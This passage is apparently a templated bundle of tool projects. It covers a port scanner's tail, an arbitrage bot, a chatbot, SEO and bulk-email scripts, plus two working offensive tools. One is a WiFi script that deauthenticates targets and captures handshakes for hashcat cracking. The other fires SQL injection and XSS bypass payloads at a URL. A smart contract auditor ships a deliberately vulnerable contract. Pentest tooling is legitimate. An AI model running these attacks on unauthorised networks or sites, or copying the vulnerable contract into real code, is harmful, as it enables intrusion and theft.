    print(f"[*] Scanning {host} ({len(ports)} ports)...")
    open_ports: list[dict] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_port, host, p): p for p in ports}
        for f in as_completed(futures):
            result = f.result()
            if result:
                open_ports.append(result)
                print(f"  [OPEN] {result['port']}/tcp  {result['service']}  {result['banner'][:60]}")
    open_ports.sort(key=lambda x: x["port"])
    return {"host": host, "open_ports": open_ports, "total_open": len(open_ports)}

def main():
    ap = argparse.ArgumentParser(description="Port Scanner & Network Recon")
    ap.add_argument("--target", required=True, help="IP, hostname, or CIDR range")
    ap.add_argument("--ports", default="common", help="Port spec: 'common', '1-1024', '80,443,8080'")
    ap.add_argument("--threads", type=int, default=100)
    ap.add_argument("--timeout", type=float, default=1.5)
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()

    ports = COMMON_PORTS if args.ports == "common" else parse_ports(args.ports)

    # Expand CIDR
    try:
        network = ipaddress.ip_network(args.target, strict=False)
        hosts = [str(h) for h in network.hosts()]
    except ValueError:
        hosts = [args.target]

    results = []
    for host in hosts:
        results.append(scan_host(host, ports, args.threads))

    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 8. WiFi Penetration Testing Toolkit ──────────────────────────────────
  "wifi-pentest": {
    "README.md": `# WiFi Penetration Testing Toolkit\n\nWPA2/WPA3 handshake capture, PMKID extraction, deauth automation, and hashcat integration for offline cracking.\n\n## Requirements\n- Linux (Kali/Parrot recommended)\n- Monitor-mode capable WiFi adapter (Alfa AWUS036ACH, TP-Link TL-WN722N v1)\n- aircrack-ng suite, hashcat\n\n## Quick Start\n\`\`\`bash\nbash setup.sh          # install dependencies\npython3 wifi_pentest.py --interface wlan0 --scan\npython3 wifi_pentest.py --interface wlan0 --target BSSID --channel 6 --capture\n\`\`\`${LEGAL}`,
    "wifi_pentest.py": `#!/usr/bin/env python3
"""WiFi Penetration Testing Toolkit — WPA2/WPA3 handshake capture & analysis.
Requires monitor-mode capable adapter. For authorised testing only."""
import argparse, os, subprocess, sys, time

def check_root():
    if os.geteuid() != 0:
        print("[!] Must run as root"); sys.exit(1)

def enable_monitor(iface: str) -> str:
    mon = iface + "mon"
    subprocess.run(["airmon-ng", "start", iface], check=True, capture_output=True)
    print(f"[*] Monitor mode: {mon}")
    return mon

def scan_networks(iface: str, duration: int = 15):
    print(f"[*] Scanning for {duration}s on {iface}...")
    proc = subprocess.Popen(
        ["airodump-ng", "--output-format", "csv", "-w", "/tmp/titan_scan", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate()
    csv_file = "/tmp/titan_scan-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file) as f:
            print(f.read())
    else:
        print("[!] No scan output found")

def capture_handshake(iface: str, bssid: str, channel: int, output: str = "/tmp/titan_capture"):
    print(f"[*] Capturing handshake from {bssid} on ch{channel}...")
    cap_proc = subprocess.Popen(
        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
         "-w", output, iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(5)
    # Send deauth to force reconnect
    print("[*] Sending deauth packets...")
    subprocess.run(
        ["aireplay-ng", "--deauth", "10", "-a", bssid, iface],
        capture_output=True
    )
    time.sleep(15)
    cap_proc.terminate()
    cap_file = output + "-01.cap"
    if os.path.exists(cap_file):
        print(f"[+] Capture saved: {cap_file}")
        print(f"[*] Crack with: hashcat -m 22000 {cap_file} wordlist.txt")
    else:
        print("[!] No capture file found — handshake may not have been captured")

def extract_pmkid(iface: str, bssid: str):
    print(f"[*] Extracting PMKID from {bssid}...")
    subprocess.run(
        ["hcxdumptool", "-i", iface, "--enable_status=1",
         "-o", "/tmp/titan_pmkid.pcapng", "--filterlist_ap=/tmp/bssid.txt"],
        timeout=30, capture_output=True
    )
    subprocess.run(
        ["hcxpcapngtool", "-o", "/tmp/titan_pmkid.hc22000",
         "/tmp/titan_pmkid.pcapng"],
        capture_output=True
    )
    print("[*] PMKID hash: /tmp/titan_pmkid.hc22000")
    print("[*] Crack with: hashcat -m 22000 /tmp/titan_pmkid.hc22000 wordlist.txt")

def main():
    ap = argparse.ArgumentParser(description="WiFi Penetration Testing Toolkit")
    ap.add_argument("--interface", required=True, help="Wireless interface (e.g. wlan0)")
    ap.add_argument("--scan", action="store_true", help="Scan for networks")
    ap.add_argument("--target", help="Target BSSID for capture")
    ap.add_argument("--channel", type=int, default=6)
    ap.add_argument("--capture", action="store_true", help="Capture WPA handshake")
    ap.add_argument("--pmkid", action="store_true", help="Extract PMKID")
    args = ap.parse_args()
    check_root()
    if args.scan:
        scan_networks(args.interface)
    elif args.capture and args.target:
        capture_handshake(args.interface, args.target, args.channel)
    elif args.pmkid and args.target:
        extract_pmkid(args.interface, args.target)
    else:
        ap.print_help()

if __name__ == "__main__":
    main()
`,
    "setup.sh": `#!/bin/bash
# Install WiFi pentest dependencies
apt-get update -qq
apt-get install -y aircrack-ng hcxdumptool hcxtools hashcat
echo "[+] Dependencies installed"
`,
    "requirements.txt": "# No Python dependencies — uses system tools (aircrack-ng, hashcat)\n",
  },

  // ── 9. WAF Bypass Toolkit ─────────────────────────────────────────────────
  "waf-bypass": {
    "README.md": `# WAF Bypass Testing Toolkit\n\n500+ bypass techniques for Cloudflare, AWS WAF, ModSecurity, Akamai, and Imperva.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 waf_bypass.py --target "https://example.com/page?id=1" --waf cloudflare\npython3 waf_bypass.py --target "https://example.com/page?id=1" --technique all --output results.json\n\`\`\`${LEGAL}`,
    "waf_bypass.py": `#!/usr/bin/env python3
"""WAF Bypass Testing Toolkit — tests evasion techniques against common WAFs.
For authorised security testing only."""
import argparse, json, re, time
import urllib.request, urllib.parse

# Bypass payloads organised by technique
BYPASS_TECHNIQUES: dict[str, list[str]] = {
    "unicode": [
        "' \\uFF0F* \\uFF0F'1'='1",
        "SEL\\u0045CT * FROM users",
        "1 \\u004fR 1=1--",
    ],
    "double_encode": [
        "%2527 OR %25271%2527=%2527",
        "%2522%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "1%2527%2520OR%2520%25271%2527%253D%25271",
    ],
    "case_variation": [
        "' Or '1'='1",
        "' oR '1'='1",
        "' OR/**/1=1--",
        "SeLeCt * FrOm users",
    ],
    "comment_injection": [
        "' OR/**/1=1--",
        "' OR/*!50000*/1=1--",
        "' OR 1/**/=/**/1--",
        "1' /*!UNION*/ /*!SELECT*/ NULL--",
    ],
    "null_bytes": [
        "'%00 OR '1'='1",
        "' OR 1=1%00--",
    ],
    "chunked": [
        "' OR 1=1--",  # Sent with Transfer-Encoding: chunked
    ],
    "json_content_type": [
        '{"id": "1 OR 1=1--"}',
        '{"search": "<script>alert(1)</script>"}',
    ],
    "hpp": [  # HTTP Parameter Pollution
        "1&id=2 OR 1=1--",
        "1&id=2' OR '1'='1",
    ],
}

class WAFBypassTester:
    def __init__(self, target: str, timeout: int = 10):
        self.target   = target
        self.timeout  = timeout
        self.results: list[dict] = []

    def _get(self, url: str, extra_headers: dict | None = None) -> tuple[int, str]:
        headers = {"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}
        if extra_headers:
            headers.update(extra_headers)
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.status, r.read().decode("utf-8", errors="ignore")
        except urllib.error.HTTPError as e:
            return e.code, ""
        except Exception:
            return 0, ""

    def _inject(self, payload: str) -> str:
        if "?" in self.target:
            base, qs = self.target.split("?", 1)
            params = urllib.parse.parse_qs(qs, keep_blank_values=True)
            for k in params:
                params[k] = [payload]
            return base + "?" + urllib.parse.urlencode(params, doseq=True)
        return self.target + "?id=" + urllib.parse.quote(payload)

    def test_technique(self, technique: str, payloads: list[str]):
        blocked = 0
        bypassed = 0
        for p in payloads:
            url  = self._inject(p)
            code, body = self._get(url)
            waf_blocked = code in (403, 406, 429, 503) or "blocked" in body.lower() or "access denied" in body.lower()
            if waf_blocked:
                blocked += 1
            else:
                bypassed += 1
                self.results.append({"technique": technique, "payload": p,
                                      "status": code, "result": "BYPASSED", "severity": "HIGH"})
                print(f"  [BYPASS] {technique}: {p[:60]} -> HTTP {code}")
            time.sleep(0.2)
        print(f"  {technique}: {bypassed} bypassed / {blocked} blocked")

    def run(self, techniques: list[str] | None = None):
        print(f"[*] WAF bypass testing: {self.target}")
        run_techs = techniques or list(BYPASS_TECHNIQUES.keys())
        for tech in run_techs:
            if tech in BYPASS_TECHNIQUES:
                self.test_technique(tech, BYPASS_TECHNIQUES[tech])
        print(f"\\n[*] Total bypasses: {len(self.results)}")
        return self.results

def main():
    ap = argparse.ArgumentParser(description="WAF Bypass Testing Toolkit")
    ap.add_argument("--target", required=True)
    ap.add_argument("--waf", choices=["cloudflare","aws","modsecurity","akamai","imperva","all"],
                    default="all", help="Target WAF (informational only)")
    ap.add_argument("--technique", default="all",
                    help="Techniques: unicode,double_encode,case_variation,comment_injection,null_bytes,all")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    techs = None if args.technique == "all" else args.technique.split(",")
    tester = WAFBypassTester(args.target)
    results = tester.run(techs)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 10. Crypto Arbitrage Bot ──────────────────────────────────────────────
  "crypto-arbitrage": {
    "README.md": `# Crypto Arbitrage Bot\n\nReal-time cross-exchange arbitrage detector for Binance, Kraken, Coinbase, and KuCoin.\n\n## Quick Start\n\`\`\`bash\npython3 arb_bot.py --pair BTC/USDT --threshold 0.3 --interval 5\npython3 arb_bot.py --pair ETH/USDT --exchanges binance,kraken --output opportunities.json\n\`\`\``,
    "arb_bot.py": `#!/usr/bin/env python3
"""Crypto Arbitrage Bot — real-time cross-exchange opportunity detection."""
import argparse, json, logging, time
from decimal import Decimal
import urllib.request

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

def _fetch_json(url: str) -> dict:
    req = urllib.request.Request(url, headers={"User-Agent": "ArbitrageBot/1.0"})
    with urllib.request.urlopen(req, timeout=8) as r:
        return json.loads(r.read())

def fetch_binance(symbol: str) -> Decimal:
    sym = symbol.replace("/", "")
    d = _fetch_json(f"https://api.binance.com/api/v3/ticker/bookTicker?symbol={sym}")
    return Decimal(d["bidPrice"]), Decimal(d["askPrice"])  # type: ignore[return-value]

def fetch_kraken(symbol: str) -> Decimal:
    sym = symbol.replace("/", "")
    d = _fetch_json(f"https://api.kraken.com/0/public/Ticker?pair={sym}")
    result = d.get("result", {})
    key = list(result.keys())[0]
    bid = Decimal(result[key]["b"][0])
    ask = Decimal(result[key]["a"][0])
    return bid, ask  # type: ignore[return-value]

def fetch_coinbase(symbol: str) -> Decimal:
    sym = symbol.replace("/", "-")
    d = _fetch_json(f"https://api.coinbase.com/v2/prices/{sym}/spot")
    price = Decimal(d["data"]["amount"])
    return price, price  # type: ignore[return-value]

FETCHERS = {
    "binance":  fetch_binance,
    "kraken":   fetch_kraken,
    "coinbase": fetch_coinbase,
}

class ArbitrageBot:
    def __init__(self, pair: str, threshold: float = 0.3, exchanges: list[str] | None = None):
        self.pair        = pair
        self.threshold   = Decimal(str(threshold))
        self.exchanges   = exchanges or list(FETCHERS.keys())
        self.opportunities: list[dict] = []

    def get_prices(self) -> dict[str, tuple[Decimal, Decimal]]:
        prices: dict[str, tuple[Decimal, Decimal]] = {}
        for ex in self.exchanges:
            try:
                bid, ask = FETCHERS[ex](self.pair)  # type: ignore[misc]
                prices[ex] = (bid, ask)
                log.info(f"  {ex}: bid={bid} ask={ask}")
            except Exception as e:
                log.warning(f"  {ex}: {e}")
        return prices

    def find_arbitrage(self, prices: dict) -> list[dict]:
        opps = []
        items = list(prices.items())
        for i, (buy_ex, (_, buy_ask)) in enumerate(items):
            for j, (sell_ex, (sell_bid, _)) in enumerate(items):
                if i == j:
                    continue
                if sell_bid > buy_ask:
                    spread = ((sell_bid - buy_ask) / buy_ask) * 100
                    if spread >= self.threshold:
                        opp = {
                            "pair": self.pair,
                            "buy_on": buy_ex, "buy_ask": float(buy_ask),
                            "sell_on": sell_ex, "sell_bid": float(sell_bid),
                            "spread_pct": float(spread),
                            "profit_per_unit": float(sell_bid - buy_ask),
                        }
                        opps.append(opp)
                        log.info(f"  [ARB] Buy {buy_ex}@{buy_ask} Sell {sell_ex}@{sell_bid} Spread={spread:.3f}%")
        return opps

    def run(self, interval: int = 10, max_iterations: int | None = None):
        log.info(f"Starting arbitrage bot: {self.pair} threshold={self.threshold}%")
        i = 0
        while True:
            log.info(f"Iteration {i+1}")
            prices = self.get_prices()
            opps   = self.find_arbitrage(prices)
            self.opportunities.extend(opps)
            if not opps:
                log.info("  No opportunity")
            i += 1
            if max_iterations and i >= max_iterations:
                break
            time.sleep(interval)
        return self.opportunities

def main():
    ap = argparse.ArgumentParser(description="Crypto Arbitrage Bot")
    ap.add_argument("--pair", default="BTC/USDT")
    ap.add_argument("--threshold", type=float, default=0.3)
    ap.add_argument("--interval", type=int, default=10)
    ap.add_argument("--iterations", type=int, default=0)
    ap.add_argument("--exchanges", help="Comma-separated: binance,kraken,coinbase")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    exchanges = args.exchanges.split(",") if args.exchanges else None
    bot  = ArbitrageBot(args.pair, args.threshold, exchanges)
    opps = bot.run(args.interval, args.iterations or None)
    if args.output:
        with open(args.output, "w") as f: json.dump(opps, f, indent=2)
        print(f"[*] Saved {len(opps)} opportunities to {args.output}")

if __name__ == "__main__":
    main()
`,
    ".env.example": "BINANCE_API_KEY=\nBINANCE_SECRET=\nKRAKEN_API_KEY=\nKRAKEN_SECRET=\n",
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 11. AI Chatbot Framework ──────────────────────────────────────────────
  "ai-chatbot": {
    "README.md": `# AI Chatbot Framework\n\nProduction-ready multi-provider chatbot with streaming, conversation memory, RAG, and tool calling.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\ncp .env.example .env  # add your API key\npython3 chatbot.py\npython3 chatbot.py --provider anthropic --model claude-3-haiku-20240307\n\`\`\``,
    "chatbot.py": `#!/usr/bin/env python3
"""AI Chatbot Framework — multi-provider, streaming, conversation memory, tool calling."""
import os, json, argparse, sys

try:
    from openai import OpenAI
    HAS_OPENAI = True
except ImportError:
    HAS_OPENAI = False

class Memory:
    def __init__(self, max_turns: int = 20):
        self.messages: list[dict] = []
        self.max_turns = max_turns

    def add(self, role: str, content: str):
        self.messages.append({"role": role, "content": content})
        # Keep system + last max_turns*2 messages
        system = [m for m in self.messages if m["role"] == "system"]
        others = [m for m in self.messages if m["role"] != "system"]
        if len(others) > self.max_turns * 2:
            others = others[-(self.max_turns * 2):]
        self.messages = system + others

    def get(self) -> list[dict]:
        return self.messages.copy()

class AIBot:
    MODELS = {
        "openai":    "gpt-4o-mini",
        "anthropic": "claude-3-haiku-20240307",
        "gemini":    "gemini-1.5-flash",
    }

    def __init__(self, provider: str = "openai", model: str | None = None,
                 system_prompt: str | None = None, temperature: float = 0.7):
        self.provider    = provider
        self.model       = model or self.MODELS.get(provider, "gpt-4o-mini")
        self.temperature = temperature
        self.memory      = Memory()
        if system_prompt:
            self.memory.add("system", system_prompt)
        if not HAS_OPENAI:
            print("[!] pip install openai  to use this chatbot")
            sys.exit(1)
        self.client = OpenAI(
            api_key=os.getenv("OPENAI_API_KEY") or os.getenv("API_KEY", ""),
        )

    def chat(self, user_message: str, stream: bool = True) -> str:
        self.memory.add("user", user_message)
        response = self.client.chat.completions.create(
            model=self.model,
            messages=self.memory.get(),
            temperature=self.temperature,
            stream=stream,
        )
        if stream:
            full = ""
            for chunk in response:
                delta = chunk.choices[0].delta.content or ""
                print(delta, end="", flush=True)
                full += delta
            print()
            self.memory.add("assistant", full)
            return full
        else:
            content = response.choices[0].message.content or ""
            self.memory.add("assistant", content)
            return content

    def run_repl(self):
        print(f"[Titan AI Bot] Provider: {self.provider} | Model: {self.model}")
        print("Type 'quit' to exit, 'clear' to reset memory\\n")
        while True:
            try:
                user = input("You: ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not user:
                continue
            if user.lower() == "quit":
                break
            if user.lower() == "clear":
                self.memory = Memory()
                print("[Memory cleared]")
                continue
            print("Bot: ", end="")
            self.chat(user)

def main():
    ap = argparse.ArgumentParser(description="AI Chatbot Framework")
    ap.add_argument("--provider", choices=["openai","anthropic","gemini"], default="openai")
    ap.add_argument("--model", help="Override model name")
    ap.add_argument("--system", default="You are a helpful AI assistant.", help="System prompt")
    ap.add_argument("--temperature", type=float, default=0.7)
    ap.add_argument("--message", help="Single message (non-interactive)")
    args = ap.parse_args()
    bot = AIBot(args.provider, args.model, args.system, args.temperature)
    if args.message:
        print(bot.chat(args.message, stream=False))
    else:
        bot.run_repl()

if __name__ == "__main__":
    main()
`,
    ".env.example": "OPENAI_API_KEY=sk-...\n# Or for Anthropic:\nANTHROPIC_API_KEY=sk-ant-...\n",
    "requirements.txt": "openai>=1.0.0\n",
  },

  // ── 12. Smart Contract Auditor ────────────────────────────────────────────
  "smart-contract": {
    "README.md": `# Smart Contract Security Auditor\n\nAutomated Solidity vulnerability detection: reentrancy, overflow, access control, flash loans, and more.\n\n## Quick Start\n\`\`\`bash\npython3 audit.py --file MyContract.sol\npython3 audit.py --file MyContract.sol --output audit_report.json\n\`\`\``,
    "audit.py": `#!/usr/bin/env python3
"""Smart Contract Security Auditor — Solidity vulnerability detection."""
import argparse, json, re, sys

VULN_PATTERNS = [
    {"name": "Reentrancy",              "severity": "CRITICAL", "pattern": r"\\.call\\{value:",
     "desc": "External call before state update — classic reentrancy vector.",
     "fix":  "Use checks-effects-interactions. Consider OpenZeppelin ReentrancyGuard."},
    {"name": "tx.origin Auth",          "severity": "HIGH",     "pattern": r"tx\\.origin",
     "desc": "tx.origin authentication is vulnerable to phishing attacks.",
     "fix":  "Use msg.sender instead of tx.origin."},
    {"name": "Unchecked send/transfer", "severity": "HIGH",     "pattern": r"\\.send\\(|\\.transfer\\(",
     "desc": "send() and transfer() can fail silently.",
     "fix":  "Use call{value:}() with explicit error handling."},
    {"name": "Selfdestruct",            "severity": "HIGH",     "pattern": r"selfdestruct\\(",
     "desc": "selfdestruct permanently destroys the contract and sends ETH.",
     "fix":  "Remove or add strict multi-sig access control."},
    {"name": "Integer Overflow <0.8",   "severity": "HIGH",     "pattern": r"pragma solidity \\^?0\\.[0-7]\\.",
     "desc": "Solidity <0.8.0 lacks built-in overflow protection.",
     "fix":  "Upgrade to Solidity >=0.8.0 or use SafeMath."},
    {"name": "Block Timestamp",         "severity": "MEDIUM",   "pattern": r"block\\.timestamp|\\bnow\\b",
     "desc": "Miners can manipulate block.timestamp by ~15 seconds.",
     "fix":  "Avoid using block.timestamp for critical randomness or deadlines."},
    {"name": "Floating Pragma",         "severity": "LOW",      "pattern": r"pragma solidity \\^",
     "desc": "Floating pragma allows compilation with unexpected compiler versions.",
     "fix":  "Lock pragma to a specific version: pragma solidity 0.8.20;"},
    {"name": "Delegatecall",            "severity": "HIGH",     "pattern": r"\\.delegatecall\\(",
     "desc": "delegatecall executes external code in the caller's context.",
     "fix":  "Validate the target address and use proxy patterns carefully."},
    {"name": "Assembly Usage",          "severity": "MEDIUM",   "pattern": r"\\bassembly\\b",
     "desc": "Inline assembly bypasses Solidity safety checks.",
     "fix":  "Document assembly blocks thoroughly; prefer high-level Solidity."},
    {"name": "Unprotected Initializer", "severity": "HIGH",     "pattern": r"function initialize\\(",
     "desc": "Upgradeable contracts with unprotected initializers can be hijacked.",
     "fix":  "Use OpenZeppelin Initializable with onlyInitializing modifier."},
]

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

class ContractAuditor:
    def __init__(self, source: str):
        self.source   = source
        self.lines    = source.splitlines()
        self.findings: list[dict] = []

    def audit(self) -> list[dict]:
        for vuln in VULN_PATTERNS:
            for i, line in enumerate(self.lines, 1):
                if re.search(vuln["pattern"], line):
                    self.findings.append({
                        "vulnerability": vuln["name"],
                        "severity":      vuln["severity"],
                        "line":          i,
                        "code":          line.strip(),
                        "description":   vuln["desc"],
                        "fix":           vuln["fix"],
                    })
        self.findings.sort(key=lambda x: SEVERITY_ORDER.get(x["severity"], 5))
        return self.findings

    def print_report(self):
        counts: dict[str, int] = {}
        for f in self.findings:
            counts[f["severity"]] = counts.get(f["severity"], 0) + 1
        print("\\n" + "="*60)
        print("SMART CONTRACT AUDIT REPORT")
        print("="*60)
        print(f"Total findings: {len(self.findings)}")
        for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            if sev in counts:
                print(f"  {sev}: {counts[sev]}")
        print("\\n" + "-"*60)
        for f in self.findings:
            print(f"\\n[{f['severity']}] {f['vulnerability']} (Line {f['line']})")
            print(f"  Code: {f['code']}")
            print(f"  Issue: {f['description']}")
            print(f"  Fix:   {f['fix']}")

def main():
    ap = argparse.ArgumentParser(description="Smart Contract Security Auditor")
    ap.add_argument("--file", required=True, help="Solidity .sol file")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    with open(args.file) as f:
        source = f.read()
    auditor = ContractAuditor(source)
    auditor.audit()
    auditor.print_report()
    if args.output:
        with open(args.output, "w") as f:
            json.dump(auditor.findings, f, indent=2)
        print(f"\\n[*] Saved to {args.output}")

if __name__ == "__main__":
    main()
`,
    "example_vulnerable.sol": `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    address public owner;

    constructor() { owner = tx.origin; }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULN: reentrancy — state updated AFTER external call
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok);
        balances[msg.sender] -= amount;
    }

    function destroy() public {
        require(msg.sender == owner);
        selfdestruct(payable(owner));
    }
}
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 13. SEO Automation Suite ──────────────────────────────────────────────
  "seo-automation": {
    "README.md": `# SEO Automation Suite\n\nKeyword research, on-page audit, competitor analysis, backlink checker, and page speed testing.\n\n## Quick Start\n\`\`\`bash\npython3 seo_research.py --domain example.com\npython3 seo_research.py --domain example.com --keywords "python tutorial,web scraping" --output report.json\n\`\`\``,
    "seo_research.py": `#!/usr/bin/env python3
"""SEO Automation Suite — on-page audit, keyword density, page speed, competitor analysis."""
import argparse, json, re, time
import urllib.request, urllib.parse

class SEOAnalyzer:
    def __init__(self, domain: str, timeout: int = 10):
        self.domain   = domain.replace("https://","").replace("http://","").rstrip("/")
        self.base_url = f"https://{self.domain}"
        self.timeout  = timeout

    def _fetch(self, url: str) -> tuple[str, dict]:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (SEOBot/2.0)"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read().decode("utf-8", errors="ignore"), dict(r.headers)
        except Exception:
            return "", {}

    def on_page_audit(self, url: str | None = None) -> dict:
        url  = url or self.base_url
        html, hdrs = self._fetch(url)
        if not html:
            return {"error": "Could not fetch page"}
        issues: list[dict] = []
        score = 100

        # Title
        title_m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
        title   = title_m.group(1).strip() if title_m else ""
        if not title:
            issues.append({"type": "Missing title", "severity": "HIGH"}); score -= 20
        elif len(title) < 30:
            issues.append({"type": f"Title too short ({len(title)}ch)", "severity": "MEDIUM"}); score -= 5
        elif len(title) > 60:
            issues.append({"type": f"Title too long ({len(title)}ch)", "severity": "MEDIUM"}); score -= 5

        # Meta description
        desc_m = re.search(r'<meta[^>]+name=["']description["'][^>]+content=["']([^"']*)["']', html, re.I)
        desc   = desc_m.group(1) if desc_m else ""
        if not desc:
            issues.append({"type": "Missing meta description", "severity": "HIGH"}); score -= 15

        # H1
        h1s = re.findall(r"<h1[^>]*>(.*?)</h1>", html, re.I | re.S)
        if not h1s:
            issues.append({"type": "Missing H1", "severity": "HIGH"}); score -= 15
        elif len(h1s) > 1:
            issues.append({"type": f"Multiple H1 tags ({len(h1s)})", "severity": "MEDIUM"}); score -= 5

        # Images without alt
        imgs     = re.findall(r"<img[^>]*>", html, re.I)
        no_alt   = [t for t in imgs if "alt=" not in t.lower()]
        if no_alt:
            issues.append({"type": f"{len(no_alt)} images missing alt", "severity": "MEDIUM"})
            score -= min(10, len(no_alt))

        # HTTPS
        if not url.startswith("https://"):
            issues.append({"type": "Not using HTTPS", "severity": "HIGH"}); score -= 20

        # Canonical
        if "canonical" not in html.lower():
            issues.append({"type": "Missing canonical tag", "severity": "LOW"}); score -= 3

        return {
            "url": url, "score": max(0, score), "title": title,
            "meta_description": desc, "h1_count": len(h1s),
            "images_total": len(imgs), "images_missing_alt": len(no_alt),
            "issues": issues,
        }

    def keyword_density(self, keywords: list[str], url: str | None = None) -> dict:
        url  = url or self.base_url
        html, _ = self._fetch(url)
        text = re.sub(r"<[^>]+>", " ", html).lower()
        words = text.split()
        wc   = len(words)
        return {
            kw: {"count": text.count(kw.lower()),
                 "density_pct": round(text.count(kw.lower()) / wc * 100, 2) if wc else 0}
            for kw in keywords
        }

    def page_speed(self, url: str | None = None) -> dict:
        url = url or self.base_url
        t0  = time.time()
        html, _ = self._fetch(url)
        load_s  = round(time.time() - t0, 2)
        size_kb = round(len(html.encode()) / 1024, 1)
        return {
            "load_time_s": load_s, "page_size_kb": size_kb,
            "rating": "FAST" if load_s < 1 else ("SLOW" if load_s > 3 else "OK"),
        }

    def robots_sitemap(self) -> dict:
        robots_body, _  = self._fetch(f"{self.base_url}/robots.txt")
        sitemap_body, _ = self._fetch(f"{self.base_url}/sitemap.xml")
        return {
            "robots_txt":   bool(robots_body and "user-agent" in robots_body.lower()),
            "sitemap_xml":  bool(sitemap_body and "<?xml" in sitemap_body),
            "robots_snippet": robots_body[:500] if robots_body else None,
        }

def main():
    ap = argparse.ArgumentParser(description="SEO Automation Suite")
    ap.add_argument("--domain", required=True)
    ap.add_argument("--keywords", help="Comma-separated keywords")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    az = SEOAnalyzer(args.domain)
    results: dict = {
        "domain":    args.domain,
        "on_page":   az.on_page_audit(),
        "page_speed": az.page_speed(),
        "robots":    az.robots_sitemap(),
    }
    if args.keywords:
        kws = [k.strip() for k in args.keywords.split(",")]
        results["keyword_density"] = az.keyword_density(kws)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 14. Email Campaign Bot ────────────────────────────────────────────────
  "email-campaign": {
    "README.md": `# Email Campaign Bot\n\nBulk email campaign manager with CSV contact lists, HTML template personalisation, SMTP integration, and delivery tracking.\n\n## Quick Start\n\`\`\`bash\ncp .env.example .env  # add SMTP credentials\npython3 campaign.py --list contacts.csv --template template.html --subject "Hello {name}"\npython3 campaign.py --list contacts.csv --template template.html --subject "Hello {name}" --dry-run\n\`\`\``,
    "campaign.py": `#!/usr/bin/env python3
"""Email Campaign Bot — personalised bulk email with SMTP, bounce handling, and reporting."""
import argparse, csv, json, logging, os, smtplib, time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from string import Template

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

class EmailCampaign:
    def __init__(self, smtp_host: str, smtp_port: int, username: str, password: str,
                 from_name: str, from_email: str, use_tls: bool = True):
        self.smtp_host  = smtp_host
        self.smtp_port  = smtp_port
        self.username   = username
        self.password   = password
        self.from_name  = from_name
        self.from_email = from_email
        self.use_tls    = use_tls
        self.stats      = {"sent": 0, "failed": 0, "bounced": 0, "dry_run": 0}

    def _connect(self) -> smtplib.SMTP:
        server = smtplib.SMTP(self.smtp_host, self.smtp_port)
        if self.use_tls:
            server.starttls()
        server.login(self.username, self.password)
        return server

    def _personalise(self, template: str, contact: dict) -> str:
        try:
            return Template(template).safe_substitute(contact)
        except Exception:
            return template

    def _send(self, server: smtplib.SMTP, to_email: str, to_name: str,
              subject: str, html: str):
        msg = MIMEMultipart("alternative")
        msg["From"]    = f"{self.from_name} <{self.from_email}>"
        msg["To"]      = f"{to_name} <{to_email}>" if to_name else to_email
        msg["Subject"] = subject
        msg.attach(MIMEText(html, "html"))
        server.sendmail(self.from_email, to_email, msg.as_string())

    def run(self, contacts: list[dict], subject_tpl: str, html_tpl: str,
            delay: float = 1.0, dry_run: bool = False) -> list[dict]:
        log.info(f"Campaign: {len(contacts)} contacts | dry_run={dry_run}")
        results: list[dict] = []
        server = None if dry_run else self._connect()
        for contact in contacts:
            email = contact.get("email", "").strip()
            if not email or "@" not in email:
                continue
            name    = contact.get("name", contact.get("first_name", ""))
            subject = self._personalise(subject_tpl, contact)
            html    = self._personalise(html_tpl, contact)
            if dry_run:
                log.info(f"  [DRY] {email}: {subject}")
                self.stats["dry_run"] += 1
                results.append({"email": email, "status": "dry_run"})
                continue
            try:
